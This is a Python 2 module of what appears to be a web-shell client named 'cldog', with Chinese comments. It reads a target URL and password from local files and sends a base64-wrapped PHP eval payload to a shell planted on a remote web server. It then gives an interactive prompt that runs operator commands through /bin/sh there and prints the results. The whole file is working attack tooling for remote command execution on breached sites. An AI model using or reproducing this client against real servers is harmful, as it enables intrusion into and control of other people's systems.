#!coding=utf8

import connnect.con
import base64


def shell():

    #读取设置信息
    f = open('./cldog.db', 'r')
    URL = f.readline()
    URL = URL.strip()
    Pass = f.readline()
    f.close()

    con = connnect.con.conn()
    con.URL = URL

    f = open('./net.db', 'r')
    tmp = f.read()
    f.close()

    if tmp == '':
        con.proxies = {}
    else:
        con.proxies = {'http': tmp}


    #读入发送数据模板，构建参数发送

    f = open('./setting/:shell', 'r')
    shell0 = Pass + '=@eval(base64_decode($_POST[action]));&action='
    shell1 = Pass + '=@eval(base64_decode($_POST[action]));&action='
    shell0 += f.readline().strip()
    shell1 += f.readline().strip()
    f.close()

    res = con.send(shell0)
    if res=='':

        print '构建shell失败'
        return 0
    else:
        print '构建成功，键入exit退出shell'
        print res
        while 1:
            cmd = raw_input('[cldog-shell] ^_^ ')
            if cmd=='exit':
                print '退出shell模块'
                return 0
            else:
                shell1+='&z1=L2Jpbi9zaA==&z2='+base64.b64encode('cd "'+res.split('\t')[0]+'";'+cmd+';')
                print con.send(shell1).encode('utf-8')

